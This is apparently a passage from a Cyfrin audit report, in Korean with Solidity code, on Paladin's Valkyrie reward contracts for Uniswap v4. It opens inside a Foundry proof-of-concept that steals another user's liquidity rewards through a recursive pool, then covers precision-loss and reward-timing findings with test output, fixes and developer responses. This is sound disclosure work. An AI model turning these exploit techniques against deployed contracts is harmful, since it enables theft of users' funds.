        address recipient;
    }

    function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
        require(msg.sender == address(manager), "caller not manager");

        CallbackData memory data = abi.decode(rawData, (CallbackData));

        address rewardTokenAddress = Currency.unwrap(data.currency);
        MockERC20 rewardToken = MockERC20(rewardTokenAddress);

        manager.sync(data.currency);

        logic.claim(data.id, rewardTokenAddress, address(manager), address(manager));
        uint256 fees = logic.accumulatedFees(rewardTokenAddress);
        assertApproxEqAbs(rewardToken.balanceOf(address(manager)), 100 ether - fees, FEE_DELTA);
        assertApproxEqAbs(rewardToken.balanceOf(address(logic)), fees, FEE_DELTA);

        manager.settleFor(data.recipient);
        data.currency.take(manager, data.recipient, rewardToken.balanceOf(address(manager)), false);

        return abi.encode(0);
    }

    function _fetchBalances(Currency currency, address user, address deltaHolder)
        internal
        view
        returns (uint256 userBalance, uint256 poolBalance, int256 delta)
    {
        userBalance = currency.balanceOf(user);
        poolBalance = currency.balanceOf(address(manager));
        delta = manager.currencyDelta(deltaHolder, currency);
    }

    function createPoolKey(address tokenA, address tokenB, uint24 fee, address _hookAddress)
        internal
        view
        returns (PoolKey memory)
    {
        if (tokenA > tokenB) (tokenA, tokenB) = (tokenB, tokenA);
        return PoolKey(Currency.wrap(tokenA), Currency.wrap(tokenB), fee, int24(60), IHooks(_hookAddress));
    }

    function setUp() public {
        deployFreshManagerAndRouters();
        MockERC20[] memory tokens = deployTokens(2, 2 ** 128);
        token0 = tokens[0];
        token1 = tokens[1];

        incentiveManager = new IncentiveManager();

        FullRangeHookImpl impl = new FullRangeHookImpl(manager, IIncentiveManager(address(incentiveManager)), fullRange);
        vm.etch(address(fullRange), address(impl).code);
        hookAddress = address(fullRange);

        key = createPoolKey(address(token0), address(token1), 3000, hookAddress);
        id = key.toId();

        token0.approve(address(fullRange), type(uint256).max);
        token1.approve(address(fullRange), type(uint256).max);

        vm.label(Currency.unwrap(key.currency0), "currency0");
        vm.label(Currency.unwrap(key.currency1), "currency1");
        vm.label(hookAddress, "fullRangeHook");
        vm.label(address(this), "test contract");
        vm.label(address(manager), "pool manager");
        vm.label(address(incentiveManager), "incentiveManager");

        incentiveManager.addHook(hookAddress);
        initPool(key.currency0, key.currency1, IHooks(hookAddress), 3000, SQRT_PRICE_1_1);

        alice = makeAddr("alice");
        bob = makeAddr("bob");

        token0.mint(alice, 100 ether);
        token1.mint(alice, 100 ether);
        vm.startPrank(alice);
        token0.approve(address(fullRange), type(uint256).max);
        token1.approve(address(fullRange), type(uint256).max);
        vm.stopPrank();
    }

    function test_addLiquidityRecursivePoC() public {
        uint256 prevBalance0 = key.currency0.balanceOf(alice);
        uint256 prevBalance1 = key.currency1.balanceOf(alice);

        (uint160 sqrtPriceX96,,,) = manager.getSlot0(key.toId());
        uint128 liquidity = LiquidityAmounts.getLiquidityForAmounts(
            sqrtPriceX96,
            TickMath.getSqrtPriceAtTick(MIN_TICK),
            TickMath.getSqrtPriceAtTick(MAX_TICK),
            10 ether,
            10 ether
        );

        FullRangeHook.AddLiquidityParams memory addLiquidityParams = FullRangeHook.AddLiquidityParams(
            key.currency0, key.currency1, 3000, 10 ether, 10 ether, 9 ether, 9 ether, alice, MAX_DEADLINE
        );

        console.log("alice adding liquidity");

        vm.expectEmit(true, true, true, true);
        emit Deposited(alice, id, 10 ether - LOCKED_LIQUIDITY);

        vm.prank(alice);
        fullRange.addLiquidity(addLiquidityParams);

        (bool hasAccruedFees, address liquidityToken) = fullRange.poolInfo(id);
        vm.label(liquidityToken, "LP token 1");
        uint256 liquidityTokenBal = IncentivizedERC20(liquidityToken).balanceOf(alice);

        assertEq(manager.getLiquidity(id), liquidityTokenBal + LOCKED_LIQUIDITY);

        assertEq(key.currency0.balanceOf(alice), prevBalance0 - 10 ether);
        assertEq(key.currency1.balanceOf(alice), prevBalance1 - 10 ether);

        assertEq(liquidityTokenBal, 10 ether - LOCKED_LIQUIDITY);
        assertEq(hasAccruedFees, false);

        // --------

        console.log("\n");
        console.log("setting up recursive pool");

        vm.prank(alice);
        MockERC20(liquidityToken).approve(hookAddress, type(uint256).max);

        address token0 = Currency.unwrap(key.currency0);
        address token1 = liquidityToken;
        vm.label(token0, "recursive token 0");
        vm.label(token1, "recursive token 1 (LP token 1)");

        if (token0 > token1) {
            (token0, token1) = (token1, token0);
            vm.label(token0, "recursive token0 (LP token 1)");
            vm.label(token1, "recursive token1");
        }

        PoolKey memory recursiveKey = PoolKey(Currency.wrap(token0), Currency.wrap(token1), 3000, 60, IHooks(hookAddress));
        PoolId recursiveId = recursiveKey.toId();
        initPool(recursiveKey.currency0, recursiveKey.currency1, IHooks(hookAddress), 3000, SQRT_PRICE_1_1);
        (, address recursiveLiquidityToken) = fullRange.poolInfo(recursiveId);
        vm.label(recursiveLiquidityToken, "LP token 2");

        // --------

        console.log("\n");
        console.log("bob deposits incentives for original pool");

        logic = new BasicIncentiveLogic(address(incentiveManager), BASE_FEE);

        vm.expectEmit(true, true, true, true);
        emit NewIncentiveLogic(1, address(logic));
        incentiveManager.addIncentiveLogic(address(logic));

        IncentivizedPoolId expectedId = IncentivizedPoolKey({ id: id, lpToken: liquidityToken }).toId();

        assertEq(incentiveManager.incentiveSystemIndex(address(logic)), 1);
        assertEq(incentiveManager.poolListedIncentiveSystems(expectedId, 1), false);

        MockERC20 rewardToken = new MockERC20("Reward Token", "RT", 18);
        vm.label(address(rewardToken), "reward token");

        rewardToken.mint(bob, 100 ether);
        vm.prank(bob);
        rewardToken.approve(address(logic), type(uint256).max);

        (address system, bool updateOnSwap) = incentiveManager.incentiveSystems(1);
        assertEq(system, address(logic));
        assertEq(updateOnSwap, false);

        vm.prank(bob);
        logic.depositRewards(expectedId, address(rewardToken), 100 ether, 2 weeks);
        assertEq(rewardToken.balanceOf(address(this)), 0);
        assertEq(rewardToken.balanceOf(address(logic)), 100 ether);
        assertEq(incentiveManager.poolListedIncentiveSystems(expectedId, 1), true);

        // --------

        console.log("\n");
        console.log("alice adding recursive liquidity");

        uint256 prevBalance0Recursive = recursiveKey.currency0.balanceOf(alice);
        uint256 prevBalance1Recursive = recursiveKey.currency1.balanceOf(alice);

        (uint160 sqrtPriceX96Recursive,,,) = manager.getSlot0(recursiveId);
        uint128 liquidityRecursive = LiquidityAmounts.getLiquidityForAmounts(
            sqrtPriceX96Recursive,
            TickMath.getSqrtPriceAtTick(MIN_TICK),
            TickMath.getSqrtPriceAtTick(MAX_TICK),
            liquidityTokenBal,
            liquidityTokenBal
        );

        FullRangeHook.AddLiquidityParams memory addLiquidityParamsRecursive = FullRangeHook.AddLiquidityParams(
            recursiveKey.currency0, recursiveKey.currency1, 3000, liquidityTokenBal, liquidityTokenBal, liquidityTokenBal * 9/10, liquidityTokenBal * 9/10, alice, MAX_DEADLINE
        );

        vm.expectEmit(true, true, true, true);
        emit Deposited(alice, recursiveId, liquidityTokenBal - LOCKED_LIQUIDITY);

        vm.prank(alice);
        fullRange.addLiquidity(addLiquidityParamsRecursive);

        (bool hasAccruedFeesRecursive,) = fullRange.poolInfo(recursiveId);
        uint256 liquidityTokenBalRecursive = IncentivizedERC20(recursiveLiquidityToken).balanceOf(alice);

        assertEq(manager.getLiquidity(recursiveId), liquidityTokenBalRecursive + LOCKED_LIQUIDITY);

        assertEq(recursiveKey.currency0.balanceOf(alice), prevBalance0Recursive - liquidityTokenBal);
        assertEq(recursiveKey.currency1.balanceOf(alice), prevBalance1Recursive - liquidityTokenBal);

        assertEq(liquidityTokenBalRecursive, liquidityTokenBal - LOCKED_LIQUIDITY);
        assertEq(hasAccruedFeesRecursive, false);

        // --------

        console.log("\n");
        console.log("maliciously claiming alice's rewards");

        skip(3 weeks);

        manager.unlock(abi.encode(CallbackData(expectedId, Currency.wrap(address(rewardToken)), address(this))));
        assertApproxEqAbs(rewardToken.balanceOf(address(this)), 100 ether - logic.accumulatedFees(address(rewardToken)), FEE_DELTA);
    }
}
```

아래에 표시된 대체 콜백을 사용하여 플래시 회계로 보상을 훔치는 것은 전송 알림 시 수행되는 사용자 상태 업데이트로 인해 불가능하다는 점에 유의하세요. 같은 맥락에서, 이는 정직한 사용자가 풀에서 유동성을 제거할 때 예치 기간 동안 쌓인 보상을 잃게 된다는 의미이기도 합니다:

```solidity
function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
    require(msg.sender == address(manager), "caller not manager");

    CallbackData memory data = abi.decode(rawData, (CallbackData));

    address rewardTokenAddress = Currency.unwrap(data.currency);
    MockERC20 rewardToken = MockERC20(rewardTokenAddress);
    (, address liquidityTokenAddress) = fullRange.poolInfo(id);
    IncentivizedERC20 liquidityToken = IncentivizedERC20(liquidityTokenAddress);
    Currency liquidityTokenCurrency = Currency.wrap(liquidityTokenAddress);

    console.log("manager earned: %s", logic.earned(data.id, rewardTokenAddress, address(manager)));

    // flash liquidity token
    liquidityTokenCurrency.take(manager, data.recipient, liquidityToken.balanceOf(address(manager)), false);

    console.log("recipient balance: %s", liquidityToken.balanceOf(data.recipient));
    console.log("recipient earned: %s", logic.earned(data.id, rewardTokenAddress, data.recipient));

    // attempt to claim rewards
    logic.claim(data.id, rewardTokenAddress, data.recipient, data.recipient);
    uint256 fees = logic.accumulatedFees(rewardTokenAddress);

    // these assertions fail as no rewards are claimed
    // assertApproxEqAbs(rewardToken.balanceOf(data.recipient), 100 ether - fees, FEE_DELTA);
    // assertApproxEqAbs(rewardToken.balanceOf(address(logic)), fees, FEE_DELTA);

    // settle liquidity token
    liquidityTokenCurrency.settle(manager, data.recipient, liquidityToken.balanceOf(data.recipient), false);

    return abi.encode(0);
}
```

**Recommended Mitigation:** `IncentivizedERC20` 토큰이 `PoolManager`로 전송되는 경우를 명시적으로 처리하는 것만으로는 충분하지 않습니다. 이러한 풀은 Uniswap v2 또는 v3와 같은 다른 장소에서도 생성될 수 있기 때문입니다. 청구를 자금을 보유한 주소로만 제한하는 것은 플래시 스왑 중의 청구를 막지 못하며 다른 단점도 있습니다.

`IncentivizedERC20` 토큰의 래핑된 버전을 사용하는 것이 재귀적 유동성 풀 생성을 가능하게 하는 가장 안전한 방법일 가능성이 높지만, 이는 복잡성을 가중시킵니다. 대안으로, 이 위험을 유동성 공급자와 보상 예치자에게 명확하게 전달하는 것이 좋습니다.

**Paladin:** 이 문제는 알려진 것이며 모든 유형의 보상 발생 ERC20에 공통적입니다. 이미 사용자와 인센티브 예치자에게 이 시나리오에 대해 알리고, 이러한 LP 토큰을 사용하려는 사람에게 다른 Uniswap 풀(V2, V3 또는 V4)이나 다른 DeFi 프로토콜에 예치하려면 ERC20을 받을 스마트 컨트랙트가 보상을 청구하고 리디렉션할 수 있는지 확인하거나 그러한 로직을 가진 ERC20의 래핑된 버전을 사용하도록 조언할 계획입니다.

**Cyfrin:** 인정함(Acknowledged).


### Precision loss can result in funds becoming stuck in incentive logic contracts

**Description:** 세 가지 모든 인센티브 로직 컨트랙트에서 예치된 보상의 `ratePerSec`는 분배할 `amount`를 `duration`으로 나누어 계산합니다:

```solidity
    function depositRewards(IncentivizedPoolId id, address token, uint256 amount, uint256 duration)
        external
        override
        nonReentrant
    {
        ...
        uint32 endTimestampCache = _state.endTimestamp;
        if (endTimestampCache < block.timestamp) {
            if (duration < MIN_DURATION) revert InvalidDuration();

            if (endTimestampCache == 0) poolRewards[id].push(token);

            // Calculate the rate
@>          uint256 rate = amount / duration;

            ...
        }
    }
```

분배할 토큰의 소수점이 작은 경우, 결코 분배되지 않고 결국 컨트랙트에 영원히 잠기게 되는 "먼지(dust)" 양이 축적될 수 있습니다. 이더리움상의 WBTC를 고려할 때, 8 소수점만 가지고 있고 토큰당 가치가 크다는 점을 감안하면, 컨트랙트에 갇힌 가치는 상당할 수 있습니다.

이는 분배 기간을 연장하기 위해 수행되는 계산에서도 문제가 됩니다. 여기서 `ratePerSec`의 정밀도 손실은 남은 보상과 업데이트된 비율을 계산할 때 증폭됩니다:

```solidity
// Calculates the leftover rewards from the current distribution
uint96 ratePerSecCache = _state.ratePerSec;
uint256 leftoverRewards = ratePerSecCache * remainingDuration;

// Calculates the new rate
uint256 newRate = (amount + leftoverRewards) / newDuration;
if (newRate < ratePerSecCache) revert CannotReduceRate();
```

내림(down rounding)으로 인해 손실된 금액은 여기서 고려되지 않으므로 실제 남은 보상은 계산된 값을 초과하게 됩니다. 새로운 비율의 계산 또한 내림으로 인한 정밀도 손실의 영향을 받습니다.

**Proof of Concept:** 다음 예시에서 사용자는 합리적인 10주 기간 동안 $10,000 상당의 WBTC를 분배하려고 합니다. 실제로는 $5,382 상당의 WBTC만 분배되는 반면 나머지 $4,618은 컨트랙트에 갇혀 누구도 회수할 수 없게 됩니다.

다음 테스트는 `BasicIncentiveLogic.t.sol`에 배치되어야 합니다:

```solidity
function test_DustAmountsLost() public {
    uint256 currentBTCValueInDollars = 89000;
    uint256 amountInDollarsToDeposit = 10000;       // 10k dollars to distribute
    uint256 btcAmount = amountInDollarsToDeposit * 10**8 / currentBTCValueInDollars;
    uint256 distributionDuration = 10 weeks;        // 10 weeks of distribution

    MockERC20 wbtc = new MockERC20("WBTC", "WBTC", 8);
    wbtc.mint(address(this), btcAmount);
    wbtc.approve(address(logic), type(uint256).max);

    PoolId poolKey;
    IncentivizedPoolId poolId;
    address lpToken = address(7);

    poolKey = createPoolKey(address(1), address(2), 3000).toId();
    poolId = IncentivizedPoolKey({ id: poolKey, lpToken: lpToken }).toId();

    manager.setListedPool(poolId, true);
    logic.updateDefaultFee(0);

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    manager.notifyAddLiquidty(systems, poolKey, lpToken, user1, int256(1 ether));

    logic.depositRewards(poolId, address(wbtc), btcAmount, distributionDuration);

    skip(10 weeks);

    // Since user1 is the only liquidity provider they own all rewards of the pool and given that all
    // distribution window has already elapsed, this is the full amount that will be distributed
    uint256 valueDistributedInDollars = logic.earned(poolId, address(wbtc), user1) * currentBTCValueInDollars / (10**8);
    uint256 valueLockedDueToRoundingInDollars = amountInDollarsToDeposit - valueDistributedInDollars;

    console.log("Value distributed:", valueDistributedInDollars);
    console.log("Value locked:", valueLockedDueToRoundingInDollars);
}

function test_ExtensionPrecisionLoss() public {
    uint256 currentBTCValueInDollars = 89000;
    uint256 amountInDollarsToDeposit = 10000;       // 10k dollars to distribute
    uint256 btcAmount = amountInDollarsToDeposit * 10**8 / currentBTCValueInDollars;
    uint256 distributionDuration = 10 weeks;        // 10 weeks of distribution

    MockERC20 wbtc = new MockERC20("WBTC", "WBTC", 8);
    wbtc.mint(address(this), btcAmount);
    wbtc.approve(address(logic), type(uint256).max);

    PoolId poolKey;
    IncentivizedPoolId poolId;
    address lpToken = address(7);

    poolKey = createPoolKey(address(1), address(2), 3000).toId();
    poolId = IncentivizedPoolKey({ id: poolKey, lpToken: lpToken }).toId();

    manager.setListedPool(poolId, true);
    logic.updateDefaultFee(0);

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    manager.notifyAddLiquidty(systems, poolKey, lpToken, user1, int256(1 ether));

    logic.depositRewards(poolId, address(wbtc), btcAmount, distributionDuration);

    uint256 initialDuration = 2 weeks;
    skip(initialDuration);

    wbtc.mint(address(this), btcAmount);
    // extend distribution by depositing the same amount again
    logic.depositRewards(poolId, address(wbtc), btcAmount, distributionDuration);

    skip(2 * distributionDuration - initialDuration);

    // Since user1 is the only liquidity provider they own all rewards of the pool and given that all
    // distribution window has already elapsed, this is the full amount that will be distributed
    uint256 valueDistributedInDollars = logic.earned(poolId, address(wbtc), user1) * currentBTCValueInDollars / (10**8);
    uint256 valueLockedDueToRoundingInDollars = 2 * amountInDollarsToDeposit - valueDistributedInDollars;

    console.log("Value distributed:", valueDistributedInDollars);
    console.log("Value locked:", valueLockedDueToRoundingInDollars);
}
```

Output:
```bash
Ran 2 tests for test/BasicIncentiveLogic.t.sol:TestBasicIncentiveLogic
[PASS] test_DustAmountsLost() (gas: 1195208)
Logs:
  Value distributed: 5382
  Value locked: 4618

[PASS] test_ExtensionPrecisionLoss() (gas: 1214484)
Logs:
  Value distributed: 10765
  Value locked: 9235
```

**Impact:** 상당한 자금 손실이 발생할 가능성이 높습니다.

**Recommended Mitigation:** 초기 분배를 위해 먼지가 축적되는 결과를 초래하는 보상 금액의 예치를 방지하는 것을 고려하세요:

```diff
    function depositRewards(IncentivizedPoolId id, address token, uint256 amount, uint256 duration)
        external
        override
        nonReentrant
    {
        if (amount == 0) revert NullAmount();
++      if (amount % duration != 0) revert RemainingDust();
        if (!IncentiveManager(incentiveManager).isListedPool(id)) revert InvalidPool();

        ...
    }
```

기존 분배를 연장할 때도 모듈러 연산(modulus)을 다시 확인하여 먼지가 쌓이는 것을 방지하는 것을 고려하세요:

```diff
    // Calculates the leftover rewards from the current distribution
    uint96 ratePerSecCache = _state.ratePerSec;
    uint256 leftoverRewards = ratePerSecCache * remainingDuration;

    // Calculates the new rate
++  if (amount + leftoverRewards % newDuration != 0) revert RemainingDust();
    uint256 newRate = (amount + leftoverRewards) / newDuration;
    if (newRate < ratePerSecCache) revert CannotReduceRate();
```

**Paladin:** 커밋 [`74060d7`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/74060d7a58161588c9f9a6791d70ef2745a155b3)로 수정되었습니다. 적은 양의 먼지에 대해 완전히 revert 하기로 결정하지 않았습니다. 이는 일부 통합을 차단할 수 있고, 수수료가 부과되거나 단순히 다른 악의적인 행위자가 더 많은 보상을 예치하기 위해 예치금을 선점하여 호출을 실패하게 만들 수 있기 때문입니다. 대신 우리는 부정확성으로 인해 손실되는 일정 비율의 먼지를 "수용"합니다.

**Cyfrin:** 검증되었습니다. 분배된 보상의 1% 이상이 먼지 양으로 축적되지 않도록 추가 검증이 수행됩니다. 이는 낮은 소수점의 고가치 토큰(예: WBTC)의 분배에 있어서 여전히 상당한 달러 가치가 될 수 있다는 점에 유의하세요.


### Rewards distributed with `TimeWeightedIncentiveLogic` can continue to be claimed after the distribution ends

**Description:** `TimeWeightedIncentiveLogic`은 포지션 수정 없이 사용자가 유동성을 예치한 시간에 비례하여 사용자에게 보상을 제공합니다. 초기 필수 램프업(ramp-up) 기간이 있으며, 이 기간 동안 사용자는 부분 보상을 받고 그 이후에는 최대 비율이 적용됩니다. 보상 분배 전에 이미 풀에서 필수 최소 기간을 통과한 사용자는 전체 기간 동안 최대 비율이 적용되어야 하며, 따라서 그들이 유일한 예치자라면 전체 보상 금액이 분배되어야 합니다. 또한 청구가 어떤 식으로든 이에 영향을 미치지 않아야 함을 이해해야 합니다. 마찬가지로, 사용자의 포지션 감소는 풀 내에서의 기간에 영향을 미치지 않아야 하는 반면, 유동성 추가 및/또는 이전을 통한 증가는 이전 잔액과 비교한 양에 따라 기간을 줄여야 합니다.

알려져 있고 수용된 트레이드오프로 인해, 보상 분배 전에 이미 필수 기간 동안 예치된 사용자는 수동으로 상태를 업데이트하지 않으면 전체 금액을 받지 못합니다. 아래 테스트에서 보상 분배 전 필수 1주 기간 동안 이미 포지션을 유지한 사용자가 체크포인트가 자동으로 업데이트되지 않아 예상한 것의 4분의 3만 받는 것을 볼 수 있습니다. 그러나 보상 예치 직전, 분배와 동시에 상태가 수동으로 업데이트되면 전체 금액을 받습니다.

```solidity
function test_TimeWeightedManualUpdate() public {
    skip(1 weeks);

    logic.updateDefaultFee(0);

    IncentivizedPoolId incentivizedId = IncentivizedPoolKey({ id: pool1, lpToken: lpToken1 }).toId();

    manager.setListedPool(incentivizedId, true);

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    // The user1 has all the liquidity of the pool, hence all the rewards should go to them
    manager.notifyAddLiquidty(systems, pool1, lpToken1, user1, int256(100 ether));

    skip(1 weeks);

    // The distributor sends 1000 tokens that will be distributed during 1 week
    uint256 amount = 1000 ether;
    uint256 duration = 1 weeks;

    // claiming without automatic state update
    uint256 snapshotId = vm.snapshotState();

    (, uint256 checkPointDuration1) = logic.userCheckpoints(incentivizedId, user1);
    console.log(checkPointDuration1);

    logic.depositRewards(incentivizedId, address(token0), amount, duration);

    skip(1 weeks);
    uint256 tokensClaimed1 = logic.claim(incentivizedId, address(token0), user1, user1);
    console.log(tokensClaimed1);

    // claiming with manual state update
    require(vm.revertToState(snapshotId));

    logic.updateUserState(incentivizedId, user1);

    (, uint256 checkPointDuration2) = logic.userCheckpoints(incentivizedId, user1);
    console.log(checkPointDuration2);

    logic.depositRewards(incentivizedId, address(token0), amount, duration);

    skip(1 weeks);
    uint256 tokensClaimed2 = logic.claim(incentivizedId, address(token0), user1, user1);
    console.log(tokensClaimed2);

    assertGt(tokensClaimed2, tokensClaimed1);
}
```

이 제한 사항을 무시하고, 보상이 언제 청구되었는지에 관계없이 분배가 끝나면 보상 발생이 종료되어야 하는 것이 의도이지만, 현재는 그렇지 않습니다. 이는 필수 기간이 전체 분배 기간보다 작거나 같을 때 보상이 분배되었지만 기간 종료 후 얼마 뒤에 청구될 때 발생한다는 점에 유의해야 합니다. 여기서, 분배 종료 직후 청구하고 다시 시도했을 때(추가 청구 없음)와 비교하여 추가 보상을 청구할 수 있습니다.

예상대로 `rewardPerToken`이 계속 증가하지는 않지만, `_earnedTimeWeighted()`에서 `timeDiff`를 사용하면 비율 계산이 의도한 것보다 커집니다:

```solidity
    function _earnedTimeWeigthed(IncentivizedPoolId id, address token, address account, uint256 newRewardPerToken)
        internal
        view
        returns (uint256 earnedAmount, uint256 leftover)
    {
        UserRewardData memory _userState = userRewardStates[id][account][token];
        if (_userState.lastRewardPerToken == newRewardPerToken) return (_userState.accrued, 0);

        uint256 userBalance = poolStates[id].userLiquidity[account];

        uint256 maxDuration = distributionRequiredDurations[id][token];
        uint256 maxEarned = (userBalance * (newRewardPerToken - _userState.lastRewardPerToken) / UNIT);

        RewardCheckpoint memory _checkpoint = userCheckpoints[id][account];
        if (_checkpoint.duration >= maxDuration) {
            earnedAmount = maxEarned + _userState.accrued;
            leftover = 0;
        } else {
            uint256 lastUpdateTs = userRewardStateUpdates[id][account][token];
            lastUpdateTs = lastUpdateTs > _checkpoint.timestamp ? lastUpdateTs : _checkpoint.timestamp;
@>          uint256 timeDiff = block.timestamp - lastUpdateTs;
            uint256 newDuration = _checkpoint.duration + timeDiff;
            if (newDuration >= maxDuration) newDuration = maxDuration;
            uint256 ratio;
            if (newDuration >= maxDuration) {
                uint256 remainingIncreaseDuration = maxDuration - _checkpoint.duration;
                uint256 left = ((((maxDuration - _checkpoint.duration - 1) * UNIT) / 2) / maxDuration);
                ratio =
                    ((left * remainingIncreaseDuration) + (UNIT * (timeDiff - remainingIncreaseDuration))) / timeDiff;
            } else {
                ratio = ((((newDuration - _checkpoint.duration - 1) * UNIT) / 2) / maxDuration);
            }
            earnedAmount = ((maxEarned * ratio) / UNIT) + _userState.accrued;
            leftover = maxEarned - earnedAmount;
        }
    }
```

아직 체크포인트를 업데이트하지 않은 사용자의 경우 저장된 타임스탬프는 0으로 초기화되지 않은 상태가 됩니다. 분배 종료 후 청구하면 비율이 증가했을 때의 기여와 필수 기간 통과 후 남은 기간의 기여를 모두 고려한 복합 비율 계산이 필요합니다. 청구 `block.timestamp`가 실제 종료 타임스탬프를 초과하면 `timeDiff`가 커져 의도한 분배 기간을 초과할 수 있습니다. 따라서 필수 기간이 지난 후의 비율 기여도 계산은 의도한 최대 분배보다 큽니다.

**Impact:** 발생이 종료되어야 하는 시점 이후에도 추가 보상을 청구할 수 있어, 분배 관리자 및/또는 다른 사용자에게 비용을 초래합니다.

**Proof of Concept:** `TimeWeightedIncentiveLogic.t.sol` 내에 배치되어야 하는 다음 테스트는 사용자가 분배가 끝난 후에도 추가 보상을 청구할 수 있음을 보여줍니다:

```solidity
function test_TimeWeightedClaimAfterEnd() public {
    skip(1 weeks);

    logic.updateDefaultFee(0);

    IncentivizedPoolId incentivizedId = IncentivizedPoolKey({ id: pool1, lpToken: lpToken1 }).toId();

    manager.setListedPool(incentivizedId, true);

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    // 1000 tokens will be distributed during 1 week
    uint256 amount = 1000 ether;
    uint256 duration = 1 weeks;

    logic.depositRewards(incentivizedId, address(token0), amount, duration);

    manager.notifyAddLiquidty(systems, pool1, lpToken1, user1, int256(100 ether));

    console.log("claiming immediately as duration ends");
    uint256 snapshotId = vm.snapshotState();

    skip(1 weeks);

    uint256 tokensEarned = logic.claim(incentivizedId, address(token0), user1, user1) / 1 ether;

    console.log(tokensEarned);

    console.log("claiming immediately as duration ends, then attempting again");
    require(vm.revertToStateAndDelete(snapshotId));
    snapshotId = vm.snapshotState();

    skip(1 weeks);

    uint256 tokensEarned1 = logic.claim(incentivizedId, address(token0), user1, user1) / 1 ether;
    skip(1 weeks);
    uint256 tokensEarned2 = logic.claim(incentivizedId, address(token0), user1, user1) / 1 ether;

    console.log(tokensEarned1);
    console.log(tokensEarned2);

    console.log("claiming some time after duration ends");
    require(vm.revertToStateAndDelete(snapshotId));
    snapshotId = vm.snapshotState();

    skip(5 weeks);

    tokensEarned = logic.claim(incentivizedId, address(token0), user1, user1) / 1 ether;

    console.log(tokensEarned);
}
```

Output:
```bash
Logs:
  claiming immediately as duration ends
  499
  claiming immediately as duration ends, then attempting again
  499
  0
  claiming some time after duration ends
  899
```

**Recommended Mitigation:** 다음 diff는 모든 테스트를 통과하지만, 복사된 `TestTimeWeightedLogic::_earnedTimeWeighted()` 구현의 수정도 필요합니다:

```diff
function _earnedTimeWeigthed(IncentivizedPoolId id, address token, address account, uint256 newRewardPerToken)
    internal
    view
    returns (uint256 earnedAmount, uint256 leftover)
{
    UserRewardData memory _userState = userRewardStates[id][account][token];
    if (_userState.lastRewardPerToken == newRewardPerToken) return (_userState.accrued, 0);

    uint256 userBalance = poolStates[id].userLiquidity[account];

    uint256 maxDuration = distributionRequiredDurations[id][token];
    uint256 maxEarned = (userBalance * (newRewardPerToken - _userState.lastRewardPerToken) / UNIT);

    RewardCheckpoint memory _checkpoint = userCheckpoints[id][account];
    if (_checkpoint.duration >= maxDuration) {
        earnedAmount = maxEarned + _userState.accrued;
        leftover = 0;
    } else {
        uint256 lastUpdateTs = userRewardStateUpdates[id][account][token];
        lastUpdateTs = lastUpdateTs > _checkpoint.timestamp ? lastUpdateTs : _checkpoint.timestamp;
--      uint256 timeDiff = block.timestamp - lastUpdateTs;
++      uint256 timeDiffEnd = poolRewardData[id][token].endTimestamp;
++      if (timeDiffEnd > block.timestamp) timeDiffEnd = block.timestamp;
++      uint256 timeDiff = timeDiffEnd - lastUpdateTs;
        uint256 newDuration = _checkpoint.duration + timeDiff;
        if (newDuration >= maxDuration) newDuration = maxDuration;
        uint256 ratio;
        if (newDuration >= maxDuration) {
            uint256 remainingIncreaseDuration = maxDuration - _checkpoint.duration;
            uint256 left = ((((maxDuration - _checkpoint.duration - 1) * UNIT) / 2) / maxDuration);
             ratio =
                ((left * remainingIncreaseDuration) + (UNIT * (timeDiff - remainingIncreaseDuration))) / timeDiff;

        } else {
            ratio = ((((newDuration - _checkpoint.duration - 1) * UNIT) / 2) / maxDuration);
        }
        earnedAmount = ((maxEarned * ratio) / UNIT) + _userState.accrued;
        leftover = maxEarned - earnedAmount;
    }
}
```

Output:
```bash
Logs:
  claiming immediately as duration ends
  499
  claiming immediately as duration ends, then attempting again
  499
  0
  claiming some time after duration ends
  499
```

대신 실제 테스트할 컨트랙트를 상속하지만 내부 함수를 노출하여 테스트에서 사용할 수 있도록 래핑하는 최소 테스트 하네스(harness) 컨트랙트를 생성하는 것이 좋습니다. 예:

```solidity
TimeWeightedLogicHarness is TimeWeightedLogic {
    ...

    function _earnedTimeWeighted_Exposed(...) public view returns (...) {
        _earnedTimeWeighted(...);
    }
}
```

이는 반복되는 로직의 오류를 방지하고 구현 자체가 올바른지 테스트하는 데 도움이 됩니다. 또한 내부 함수의 부분적 호출에 대한 반환 값에 대해 공개 엔트리포인트의 반환 값을 어설션(assertion)하여 구현 자체에 대해 테스트하는 것을 피하는 것이 좋습니다.

**Paladin:** 커밋 [`f8dc21e`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/f8dc21e765f6b2568ae221dc5e2855181896c6bb)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 시간 차이 계산은 더 이상 분배 종료 타임스탬프를 초과할 수 없습니다.

\clearpage
## Medium Risk


### `IncentivizedERC20` should not be hardcoded to 18 decimals

**Description:** 주어진 풀의 유동성을 나타내기 위해 새로운 `IncentivizedERC20`이 생성될 때마다 그 소수점은 18로 하드코딩됩니다:

```solidity
contract IncentivizedERC20 is ERC20, Owned {
    ...
    constructor(string memory name, string memory symbol, PoolId id) ERC20(name, symbol, 18) Owned(msg.sender) {
        hook = msg.sender;
        poolId = id;
    }
    ...
}
```

Uniswap v4 풀의 두 토큰이 모두 18 소수점을 가진 경우 출력 유동성도 동일한 소수점 정밀도를 가지므로 괜찮습니다. 그러나 풀의 토큰 중 하나라도 18 소수점 미만인 경우 출력 유동성은 그 소수점 양을 상속합니다. `IncentivizedERC20` 소수점은 18로 하드코딩되지만 실제 기본 유동성 소수점은 더 적으므로, 이 토큰과 상호 작용하는 타사와의 외부 통합이 중단될 수 있습니다.

또한 이는 `MINIMUM_LIQUIDITY`가 유동성 소수점에 따라 가변적이어야 함을 의미합니다. 6 소수점 유동성 토큰에 대한 `1e3`은 18 소수점 유동성 토큰의 동일한 양보다 훨씬 더 가치 있을 가능성이 높기 때문입니다.

**Impact:** USDC와 USDT가 가장 널리 사용되는 토큰 중 일부이며 둘 다 6 소수점을 가지고 있다는 점을 고려하면 이 문제가 발생할 가능성은 중간-높음입니다. 외부 통합자에게 발생할 수 있는 문제의 심각성은 다양할 것입니다.

**Proof of Concept:** 다음 테스트는 `FullRangeHook.t.sol`에 배치되어야 합니다:

```solidity
function test_LessThan18Decimals() public {
